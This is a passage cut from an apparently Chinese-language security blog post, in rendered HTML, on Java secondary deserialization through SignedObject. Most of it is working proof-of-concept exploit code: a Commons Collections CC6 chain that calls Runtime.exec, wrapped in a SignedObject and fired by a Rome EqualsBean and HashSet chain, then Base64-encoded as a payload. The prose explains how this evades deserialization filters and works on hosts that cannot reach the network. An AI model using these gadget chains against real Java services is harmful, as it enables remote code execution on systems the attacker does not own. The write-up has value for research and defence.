#61AFEF\">InvokerTransformer</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;getMethod&quot;</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Class</span><span style=\"color: #ABB2BF\">[]&#123;</span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">class</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #E5C07B\">Class</span><span style=\"color: #ABB2BF\">[].</span><span style=\"color: #E5C07B\">class</span><span style=\"color: #ABB2BF\">&#125;,</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">[]&#123;</span><span style=\"color: #98C379\">&quot;getRuntime&quot;</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #D19A66\">null</span><span style=\"color: #ABB2BF\">&#125;),</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">                </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">InvokerTransformer</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;invoke&quot;</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Class</span><span style=\"color: #ABB2BF\">[]&#123;</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">class</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">[].</span><span style=\"color: #E5C07B\">class</span><span style=\"color: #ABB2BF\">&#125;,</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">[]&#123;</span><span style=\"color: #D19A66\">null</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #D19A66\">null</span><span style=\"color: #ABB2BF\">&#125;),</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">                </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">InvokerTransformer</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;exec&quot;</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Class</span><span style=\"color: #ABB2BF\">[]&#123;</span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">class</span><span style=\"color: #ABB2BF\">&#125;,</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">[]&#123;</span><span style=\"color: #98C379\">&quot;calc&quot;</span><span style=\"color: #ABB2BF\">&#125;)</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        &#125;;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ChainedTransformer</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">chainedTransformer</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ChainedTransformer</span><span style=\"color: #ABB2BF\">(transformers);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\">&lt;</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">&gt; </span><span style=\"color: #E06C75\">map</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\">&lt;&gt;();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">/// 先不传入chainedTransformer，之后等hashmap的put方法执行完毕之后再存入，而这里存入ConstantTransformer，是因为后续hashcode的put方法触发链子的时候，最终调用transform方法不会有其他的代码执行影响流程</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">Map</span><span style=\"color: #ABB2BF\">&lt;</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">&gt; </span><span style=\"color: #E06C75\">lazymap</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">LazyMap</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">decorate</span><span style=\"color: #ABB2BF\">(map,</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ConstantTransformer</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">1</span><span style=\"color: #ABB2BF\">));</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//==========================================================================</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//HashMap&lt;Object,Object&gt; map3=new HashMap&lt;&gt;();</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//===========================初始化 TiedMapEntry以及hashmap</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">TiedMapEntry</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">tiedMapeEntry</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">TiedMapEntry</span><span style=\"color: #ABB2BF\">(lazymap,</span><span style=\"color: #98C379\">&quot;aaa&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\">&lt;</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\">&gt; </span><span style=\"color: #E06C75\">map2</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\">&lt;&gt;();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">map2</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">put</span><span style=\"color: #ABB2BF\">(tiedMapeEntry,</span><span style=\"color: #98C379\">&quot;bbb&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">lazymap</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">remove</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;aaa&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//========================================反射写入chainedTransfomer</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">Class</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">c</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #E5C07B\">LazyMap</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">class</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">Field</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">factoryField</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #E5C07B\">c</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getDeclaredField</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;factory&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">factoryField</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">setAccessible</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">true</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">factoryField</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">set</span><span style=\"color: #ABB2BF\">(lazymap,chainedTransformer);</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">return</span><span style=\"color: #ABB2BF\"> map2;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">&#125;</span></span>\n<span class=\"line\"></span></code></pre></div><p>当然，二次反序列化的意义是在于绕过和解决不出网问题，所以最重要的不是这个 POC 生成的 base64 数据（用来直接打的 paylaod），而是如何去利用和拼接我们想要的部分。比如我为什么选择用 Rome 中的<code>BadAttributeValueExpException</code>链来进行 POC 的组成，其中一个原因就是为了绕过 hashMap 或者 hashtable 的限制。</p>\n<h3 id=\"equalsBean\"><a href=\"#equalsBean\" class=\"headerlink\" title=\"equalsBean\"></a>equalsBean</h3><p>equalsBean 具体获取 getter 方法并调用的逻辑如下（beanEquals 方法），因为是 euqals 比较方法，所以相较于 toStringBean 的 toString 方法，会有两次 invoke 调用。前置条件是一样的：1.必须是 getter 形式 2.必须是无参数的 getter 方法<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1717397936654-eb6838c7-a077-40ba-b940-02f715992862.png#averageHue=%2328292a&clientId=uda884844-f244-4&from=paste&height=399&id=u97daa5d8&originHeight=748&originWidth=1684&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=261130&status=done&style=none&taskId=u07466155-dba6-4758-b4f1-8068e47c5fd&title=&width=898.1333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里的 bean1 和 bean2 也是可控的。bean1 是初始化 EqualsBean 得到的,但其实作为属性值，它也能够通过反射写入，bean2 是我们调用 beanEquals(obj) 方法时的参数<br>那么这里的思路就是让 bean1 或者 bean2 为 SignedObject。我们可以通过反射写入，让 bean1 直接赋值为 SignedObject。bean2 由于 equalsbean 本身的在构造时有一些逻辑为了满足条件，我们恰好让传入的bean2 变成了SignedObject。<br>这里所涉及的 equalsbean 调用链的部分还有一些逻辑需要好好分析，不过篇幅原因，可以参考之前专门分析 Rome 链的笔记：<a href=\"https://stoocea.github.io/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html#0x06-EqualsBean%E9%93%BE\">https://stoocea.github.io/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html#0x06-EqualsBean%E9%93%BE</a><br>POC 可以构造为如下形式：</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki one-dark-pro\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #C678DD\">package</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">org.example.</span><span style=\"color: #FFFFFF\">S</span><span style=\"color: #C678DD\">igned</span><span style=\"color: #FFFFFF\">O</span><span style=\"color: #C678DD\">bject</span><span style=\"color: #FFFFFF\">POC</span><span style=\"color: #C678DD\">s</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">com.sun.syndication.feed.impl.EqualsBean</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.functors.ChainedTransformer</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.apache.commons.collections.functors.ConstantTransformer</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">org.example.CCEXP</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ByteArrayInputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ByteArrayOutputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ObjectInputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.io.ObjectOutputStream</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.lang.reflect.Field</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.security.KeyPair</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.security.KeyPairGenerator</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.security.Signature</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.security.SignedObject</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"><span style=\"color: #C678DD\">import</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">java.util.*</span><span style=\"color: #ABB2BF\">;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C678DD\">public</span><span style=\"color: #E06C75\"> </span><span style=\"color: #C678DD\">class</span><span style=\"color: #E06C75\"> </span><span style=\"color: #E5C07B\">SignedObjectPOC2</span><span style=\"color: #E06C75\"> </span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">public</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> main</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\">[] </span><span style=\"color: #E06C75; font-style: italic\">args</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//获取CC6的入口HashMap</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">CCEXP</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">ccexp</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">CCEXP</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//SignedObject的初始化，涉及PrivateKey以及Signature对象的处理,signedObject中对于此项的设置我们可以参考Java.security.interface中的几个密钥接口，这里的初始化赋值就是在赋值何种格式的密钥</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">KeyPairGenerator</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">kpg</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">KeyPairGenerator</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getInstance</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;DSA&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">kpg</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">initialize</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #D19A66\">1024</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">KeyPair</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">kp</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">kpg</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">generateKeyPair</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">SignedObject</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">signedObject</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">SignedObject</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">ccexp</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getPayloadCC6</span><span style=\"color: #ABB2BF\">(), </span><span style=\"color: #E5C07B\">kp</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getPrivate</span><span style=\"color: #ABB2BF\">(), </span><span style=\"color: #E5C07B\">Signature</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getInstance</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;DSA&quot;</span><span style=\"color: #ABB2BF\">));</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//equalsBean链构造内容，这里入口换成hashtable或者hashSet都行</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">EqualsBean</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">bean</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">EqualsBean</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">String</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">class</span><span style=\"color: #ABB2BF\">, </span><span style=\"color: #98C379\">&quot;s&quot;</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">map1</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">HashMap</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">HashMap</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">map2</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">HashMap</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">map1</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">put</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;yy&quot;</span><span style=\"color: #ABB2BF\">, bean);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">map1</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">put</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;zZ&quot;</span><span style=\"color: #ABB2BF\">, signedObject);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">map2</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">put</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;zZ&quot;</span><span style=\"color: #ABB2BF\">, bean);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">map2</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">put</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #98C379\">&quot;yy&quot;</span><span style=\"color: #ABB2BF\">, signedObject);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//Hashtable hashtable =new Hashtable();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">HashSet</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">hashSet</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">HashSet</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">hashSet</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">add</span><span style=\"color: #ABB2BF\">(map1);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">hashSet</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">add</span><span style=\"color: #ABB2BF\">(map2);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//hashtable.put(map1,&quot;1&quot;);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #7F848E; font-style: italic\">//hashtable.put(map2,&quot;2&quot;);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">setFieldValue</span><span style=\"color: #ABB2BF\">(bean, </span><span style=\"color: #98C379\">&quot;_beanClass&quot;</span><span style=\"color: #ABB2BF\">,</span><span style=\"color: #E5C07B\">SignedObject</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #E5C07B\">class</span><span style=\"color: #ABB2BF\">);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">setFieldValue</span><span style=\"color: #ABB2BF\">(bean, </span><span style=\"color: #98C379\">&quot;_obj&quot;</span><span style=\"color: #ABB2BF\">,signedObject);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">baos</span><span style=\"color: #56B6C2\">=</span><span style=\"color: #61AFEF\">unSerial</span><span style=\"color: #ABB2BF\">(hashSet);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #61AFEF\">Base64Encode</span><span style=\"color: #ABB2BF\">(baos);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #61AFEF\"> unSerial</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">Object</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">o</span><span style=\"color: #ABB2BF\">)</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">throws</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #E5C07B\">Exception</span><span style=\"color: #ABB2BF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">bs</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ObjectOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">out</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ObjectOutputStream</span><span style=\"color: #ABB2BF\">(bs);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">out</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">writeObject</span><span style=\"color: #ABB2BF\">(o);</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">ObjectInputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75\">in</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ObjectInputStream</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #C678DD\">new</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #61AFEF\">ByteArrayInputStream</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">bs</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">toByteArray</span><span style=\"color: #ABB2BF\">()));</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">in</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">readObject</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #E5C07B\">in</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">close</span><span style=\"color: #ABB2BF\">();</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">return</span><span style=\"color: #ABB2BF\"> bs;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #E06C75\">    </span><span style=\"color: #C678DD\">private</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">static</span><span style=\"color: #61AFEF\"> </span><span style=\"color: #C678DD\">void</span><span style=\"color: #61AFEF\"> Base64Encode</span><span style=\"color: #ABB2BF\">(</span><span style=\"color: #E5C07B\">ByteArrayOutputStream</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E06C75; font-style: italic\">bs</span><span style=\"color: #ABB2BF\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #ABB2BF\">        </span><span style=\"color: #C678DD\">byte</span><span style=\"color: #ABB2BF\">[] </span><span style=\"color: #E06C75\">encode</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #56B6C2\">=</span><span style=\"color: #ABB2BF\"> </span><span style=\"color: #E5C07B\">Base64</span><span style=\"color: #ABB2BF\">.</span><span style=\"color: #61AFEF\">getEncoder</span><span style=\"color: #ABB2BF\">().</span><span style=\"color: #61AFEF\">encode</span><span style=\"color: 